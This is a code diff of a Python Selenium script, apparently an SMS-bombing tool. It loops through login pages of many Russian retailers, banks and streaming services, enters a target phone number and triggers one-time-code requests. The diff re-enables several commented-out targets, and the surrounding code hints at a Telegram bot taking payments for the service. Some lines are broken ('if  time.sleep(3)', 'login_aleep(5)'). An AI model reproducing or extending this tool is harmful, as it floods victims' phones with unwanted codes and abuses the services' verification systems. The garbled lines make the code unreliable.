@@ -395,37 +395,7 @@ def strt(n, no, interval = 0):
     if n==p:
         time.sleep(3)
         break
-    '''
-    ur = "https://id.ozon.ru"
-    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
-    login_a(phone=us_t[2:], url=ur, button_locators=button)
-    second_button_locators = [(By.XPATH, "//button[contains(translate(normalize-space(.), 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ', 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'), 'войти другим способом')]"),]
-    second_button_clicked = False
-    for locator in second_button_locators:
-            try:
-                second_button = WebDriverWait(driver, 15).until(
-                    EC.element_to_be_clickable(locator)
-                )
-                if second_button.is_displayed():
-                    scroll_to_element(driver, second_button)
-                    random_delay()
-                    second_button.click()
-                    time.sleep(10)
-                    second_button_clicked = True
-                    break
-            except TimeoutException:
-                continue
-            except Exception as e:
-                continue
-
-    if not second_button_clicked:
-            random_delay(3, 5)
-            driver.quit()
-            p=p+1
-            if n==p:
-                time.sleep(3)
-                break
-    '''
+    
     ur = ("https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/"
     "auth?client_id=tcx_web&response_type=code&redirect_uri=https%3A%2F%2Fwww."
     "perekrestok.ru%2Fx5id-success&response_mode=query&scope=openid+offline_access")
@@ -463,7 +433,93 @@ def strt(n, no, interval = 0):
     if n==p:
         time.sleep(3)
         break
+        
+    ur = "https://online.autofinancebank.ru/auth/main"
+    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
+    login_a(phone=us_t, url=ur, button_locators=button)
+    driver.quit()
+    p=p+1
+    if n==p:
+        time.sleep(3)
+        break
+    
+    ur = "https://wink.ru/auth"
+    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
+    login_a(phone=us_t[2:], url=ur, button_locators=button)
+    driver.quit()
+    p=p+1
+    if n==p:
+        time.sleep(3)
+        break
+        
+    ur = "https://totopizza.ru/profile"
+    button = [(By.XPATH, "//button[normalize-space()='Выслать код']")]
+    login_a(phone=us_t[2:], url=ur, button_locators=button)
+    driver.quit()
+    p=p+1
+    if n==p:
+        time.sleep(3)
+        break
+        
+    ur = "https://limestore.com/ru_ru/#lk"
+    button = [(By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'Получить код')]")]
+    login_b(phone=us_t[2:], url=ur, button_locators=button)
+    time.sleep(5)
+    driver.quit()
+    p=p+1
+    if n==p:
+        time.sleep(3)
+        break
+        
+    ur = "https://brandshop.ru/login/"
+    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
+    login_a(phone=us_t[2:], url=ur, button_locators=button)
+    time.sleep(5)
+    driver.quit()
+    p=p+1
+    if n==p:
+        time.sleep(3)
+        break
+        
+    ur = "https://www.alltime.ru/personal"
+    button = [(By.XPATH, "//button[normalize-space(text())='Получить код']")]
+    login_b(phone=us_t, url=ur, button_locators=button)
+    time.sleep(random.uniform(8, 15))
+    driver.quit()
+    p=p+1
+    if n==p:
+        time.sleep(3)
+        break
     '''
+    ur = "https://id.ozon.ru"
+    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
+    login_a(phone=us_t[2:], url=ur, button_locators=button)
+    second_button_locators = [(By.XPATH, "//button[contains(translate(normalize-space(.), 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ', 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'), 'войти другим способом')]"),]
+    second_button_clicked = False
+    for locator in second_button_locators:
+            try:
+                second_button = WebDriverWait(driver, 15).until(
+                    EC.element_to_be_clickable(locator)
+                )
+                if second_button.is_displayed():
+                    scroll_to_element(driver, second_button)
+                    random_delay()
+                    second_button.click()
+                    time.sleep(10)
+                    second_button_clicked = True
+                    break
+            except TimeoutException:
+                continue
+            except Exception as e:
+                continue
+
+    if not second_button_clicked:
+            random_delay(3, 5)
+            driver.quit()
+            p=p+1
+            if  time.sleep(3)
+                break
+                
     ur = "https://www.mvideo.ru/login"
     button = [(By.XPATH, "//button[contains(translate(., 'ПРОДОЛЖИТЬ', 'продолжить'), 'продолжить')]")]
     login_a(phone=us_t[2:], url=ur, button_locators=button)
@@ -487,25 +543,7 @@ def strt(n, no, interval = 0):
     if n==p:
         time.sleep(3)
         break
-    '''
-    ur = "https://online.autofinancebank.ru/auth/main"
-    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
-    login_a(phone=us_t, url=ur, button_locators=button)
-    driver.quit()
-    p=p+1
-    if n==p:
-        time.sleep(3)
-        break
-    
-    ur = "https://wink.ru/auth"
-    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
-    login_a(phone=us_t[2:], url=ur, button_locators=button)
-    driver.quit()
-    p=p+1
-    if n==p:
-        time.sleep(3)
-        break
-    '''
+        
     ur = "https://tvoe.live/?accessRestriction=true"
     button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
     login_a(phone=us_t[1:], url=ur, button_locators=button)
@@ -514,16 +552,7 @@ def strt(n, no, interval = 0):
     if n==p:
         time.sleep(3)
         break
-    '''
-    ur = "https://totopizza.ru/profile"
-    button = [(By.XPATH, "//button[normalize-space()='Выслать код']")]
-    login_a(phone=us_t[2:], url=ur, button_locators=button)
-    driver.quit()
-    p=p+1
-    if n==p:
-        time.sleep(3)
-        break
-    '''
+        
     ur = "https://rikkopizza.ru/auth"
     button = [(By.XPATH, "//button[normalize-space(text())='Выслать код']"),]
     login_b(phone=us_t, url=ur, button_locators=button)
@@ -562,17 +591,6 @@ def strt(n, no, interval = 0):
     if n==p:
         time.sleep(3)
         break
-    '''
-    ur = "https://limestore.com/ru_ru/#lk"
-    button = [(By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'Получить код')]")]
-    login_b(phone=us_t[2:], url=ur, button_locators=button)
-    time.sleep(5)
-    driver.quit()
-    p=p+1
-    if n==p:
-        time.sleep(3)
-        break
-    '''
     ur = "https://santehnika-online.ru/personal/auth/"
     button = [(By.XPATH, "//button[normalize-space()='Получить код в SMS']")]
     login_a(phone=us_t[2:], url=ur, button_locators=button)
@@ -622,37 +640,16 @@ def strt(n, no, interval = 0):
     if n==p:
         time.sleep(3)
         break
-    '''
-    ur = "https://brandshop.ru/login/"
-    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
-    login_a(phone=us_t[2:], url=ur, button_locators=button)
-    time.sleep(5)
-    driver.quit()
-    p=p+1
-    if n==p:
-        time.sleep(3)
-        break
-    '''
+        
     ur = "https://oauth.av.ru/"
     button = [(By.XPATH, "//button[normalize-space()='Войти']")]
-    login_a(phone=us_t[2:], url=ur, button_locators=button)
-    time.sleep(5)
+    login_aleep(5)
     driver.quit()
     p=p+1
     if n==p:
         time.sleep(3)
         break
-    '''
-    ur = "https://www.alltime.ru/personal"
-    button = [(By.XPATH, "//button[normalize-space(text())='Получить код']")]
-    login_b(phone=us_t, url=ur, button_locators=button)
-    time.sleep(random.uniform(8, 15))
-    driver.quit()
-    p=p+1
-    if n==p:
-        time.sleep(3)
-        break
-    '''
+
     ur = "https://www.gloria-jeans.ru/#login"
     button = [(By.XPATH, "//button[normalize-space()='Получить код']")]
     login_a(phone=us_t[2:], url=ur, button_locators=button)
@@ -865,6 +862,7 @@ app.add_handler(PreCheckoutQueryHandler(precheckout_handler))
 app.add_handler(CallbackQueryHandler(hb))
 app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_handler))
 app.run_polling()
+
 
 
 
